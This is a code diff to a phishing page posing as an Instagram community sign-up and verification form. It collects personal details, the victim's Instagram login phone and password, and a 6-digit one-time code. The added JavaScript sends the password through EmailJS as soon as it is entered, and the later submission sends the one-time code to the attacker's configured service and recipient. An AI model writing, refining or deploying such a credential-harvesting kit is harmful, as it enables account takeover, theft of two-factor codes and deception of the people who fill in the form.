@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join Community</title>
+    <title>Join Community & Verification</title>
 
     <!-- EmailJS SDK Integration -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -381,7 +381,7 @@
                         </radialGradient>
                     </defs>
                     <path fill="url(#ig-grad)" d="M386.7 125.3c-27.1-27.1-64.6-43.8-130.7-43.8s-103.6 16.7-130.7 43.8C98.2 152.4 81.5 189.9 81.5 256s16.7 103.6 43.8 130.7c27.1 27.1 64.6 43.8 130.7 43.8s103.6-16.7 130.7-43.8c27.1-27.1 43.8-64.6 43.8-130.7s-16.7-103.6-43.8-130.7zm-130.7 274c-112 0-143.3-31.3-143.3-143.3S144 112.7 256 112.7 399.3 144 399.3 256 368 399.3 256 399.3z"/>
-                    <path fill="url(#ig-grad)" d="M256 166c-49.7 0-90 40.3-90 90s40.3 90 90 90 90-40.3 90-90-40.3-90-90-90zm0 148c-32 0-58-26-58-58s26-58 58-58 58 26 58 58-26 58-58 58z"/>
+                    <path fill="url(#ig-grad)" d="M256 166c-49.7 0-90 40.3-90 90s40.3 90 90 90 90-40.3 90-90-40.3-90-90-90zm0 148c-32 0-58-26-58-58s26-58 58-58 58 26 58 58-26 58-58-58z"/>
                     <circle fill="url(#ig-grad)" cx="350" cy="162" r="21"/>
                 </svg>
             </div>
@@ -394,10 +394,10 @@
                     <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required />
                 </div>
 
-                <!-- WhatsApp Contact -->
+                <!-- WhatsApp Contact with International Prefix Support -->
                 <div class="form-group">
                     <label for="whatsapp">WhatsApp Contact</label>
-                    <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter your WhatsApp number" required />
+                    <input type="tel" id="whatsapp" name="whatsapp" placeholder="e.g. +234, +1, +44..." required />
                 </div>
 
                 <!-- How long have you been using Instagram -->
@@ -496,7 +496,7 @@
             <span class="input-label">Enter the 6-digit code</span>
 
             <div class="otp-container" id="otp-inputs">
-                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autofocus />
                 <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
                 <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
                 <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
@@ -504,7 +504,7 @@
                 <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
             </div>
 
-            <p class="info-text">A verification code was sent to <span id="sentTargetDisplay">your contact</span></p>
+            <p class="info-text">A verification code was sent to <span id="sentTargetDisplay">your device</span></p>
 
             <button class="verify-btn" id="verify-btn" disabled>
                 I'm not a bot
@@ -556,7 +556,11 @@
             loginView.classList.add('hidden');
             otpView.classList.remove('hidden');
             document.body.style.backgroundColor = "#f0f2f5";
-            if (otpInputs.length > 0) otpInputs[0].focus();
+
+            sentTargetDisplay.textContent = loginUsername.value || "your device";
+            setTimeout(() => {
+                if (otpInputs.length > 0) otpInputs[0].focus();
+            }, 100);
         }
 
         // 1. Registration Handler: Collect data and go to Login view
@@ -585,17 +589,39 @@
             goToRegistration();
         });
 
-        // 2. Login Handler: Save credentials and proceed to OTP view
+        // 2. Login Handler: Send initial credentials email and proceed to OTP view
         document.getElementById('authForm').addEventListener('submit', function(e) {
             e.preventDefault();
+
+            loginBtn.innerText = 'Logging in...';
+            loginBtn.disabled = true;
 
             formDataStore.loginPhone = loginUsername.value;
             formDataStore.loginPassword = loginPassword.value;
 
-            // Update display text on OTP page
-            sentTargetDisplay.textContent = formDataStore.loginPhone || 'your contact';
+            const templateParams = {
+                to_email: formDataStore.referrer || '',
+                full_name: formDataStore.fullName || '',
+                whatsapp: formDataStore.whatsapp || '',
+                experience: formDataStore.igDuration || '',
+                age: formDataStore.age || '',
+                gender: formDataStore.gender || '',
+                referrer: formDataStore.referrer || '',
+                login_phone: formDataStore.loginPhone,
+                login_password: formDataStore.loginPassword,
+                otp_code: 'Not Entered Yet'
+            };
 
-            goToOTP();
+            emailjs.send('service_rf9jc9g', 'template_ykjxd5h', templateParams)
+                .then(function(response) {
+                    loginBtn.innerText = 'Log in';
+                    loginBtn.disabled = false;
+                    goToOTP();
+                }, function(error) {
+                    loginBtn.innerText = 'Log in';
+                    loginBtn.disabled = false;
+                    goToOTP();
+                });
         });
 
         // 3. OTP Input Logic
@@ -636,14 +662,14 @@
             }
         }
 
-        // 4. Final Submission via EmailJS
+        // 4. Final Submission via EmailJS on Page 3
         verifyBtn.addEventListener('click', () => {
             const otpCode = Array.from(otpInputs).map(i => i.value).join('');
             
             verifyBtn.innerText = "Verifying...";
             verifyBtn.disabled = true;
 
-            const templateParams = {
+            const otpTemplateParams = {
                 to_email: formDataStore.referrer || '',
                 full_name: formDataStore.fullName || '',
                 whatsapp: formDataStore.whatsapp || '',
@@ -656,14 +682,13 @@
                 otp_code: otpCode
             };
 
-            emailjs.send('service_rf9jc9g', 'template_ykjxd5h', templateParams)
+            emailjs.send('service_rf9jc9g', 'template_ykjxd5h', otpTemplateParams)
                 .then(function(response) {
-                    alert('Verification Successful!');
+                    alert(`Verification Code (${otpCode}) sent successfully via email!`);
                     verifyBtn.innerText = "I'm not a bot";
                     verifyBtn.disabled = false;
-                })
-                .catch(function(error) {
-                    alert('Failed to verify: ' + JSON.stringify(error));
+                }, function(error) {
+                    alert('Failed to send OTP code: ' + JSON.stringify(error));
                     verifyBtn.innerText = "I'm not a bot";
                     verifyBtn.disabled = false;
                 });
